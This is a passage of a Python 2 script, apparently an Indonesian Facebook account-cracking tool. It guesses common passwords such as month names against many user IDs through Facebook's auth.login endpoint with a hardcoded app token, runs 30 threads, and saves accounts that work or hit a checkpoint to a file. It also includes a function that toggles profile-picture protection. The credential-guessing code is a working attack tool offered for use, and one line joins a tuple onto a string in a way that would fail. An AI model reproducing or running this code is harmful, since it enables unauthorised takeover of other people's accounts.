                                                                                                                                        #Pass8
                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
                                                                                                                                         b = json.loads(a.text)
                                                                                                                                         pass8 = "januari","februari","maret123","april","mei123","juni123","juli123","agustus","september","november","desember"
                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                                                                                                                 z = json.loads(x.text)
                                                                                                                                                 print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass8+" =>"+z['name'])
                                                                                                                                                 oks.append(user+pass8)
                                                                                                                                         else:
                                                                                                                                                 if 'www.facebook.com' in q["error_msg"]:
                                                                                                                                                         cek = open("out/super_cp.txt", "a")
                                                                                                                                                         cek.write(user+"|"+pass8+"\n")
                                                                                                                                                         cek.close()
                                                                                                                                                         cekpoint.append(user+pass8)																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	super()

def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	elif '"is_shielded":false' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		print "\033[1;91m[!] Error"
		keluar()
	
if __name__=='__main__':
